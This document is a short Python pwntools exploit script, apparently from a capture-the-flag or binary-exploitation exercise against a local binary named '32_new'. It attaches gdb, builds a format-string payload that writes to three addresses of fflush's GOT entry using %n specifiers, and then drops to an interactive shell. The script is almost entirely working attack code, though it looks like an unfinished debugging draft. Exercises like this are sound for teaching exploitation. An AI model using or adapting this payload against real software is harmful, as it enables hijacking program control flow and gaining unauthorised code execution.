#Import pwntools
from pwn import *

#Establish the target process, or network connection
target = process('./32_new')

#Attach gdb if it is a process
gdb.attach(target, gdbscript='b *0x080487dc')

#Print the first line of text
print target.recvline()

#Establish the addresses which we will be writing to
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

#Establish the necessary inputs for our input, so we can write to the addresses
fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"

#Form the payload
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
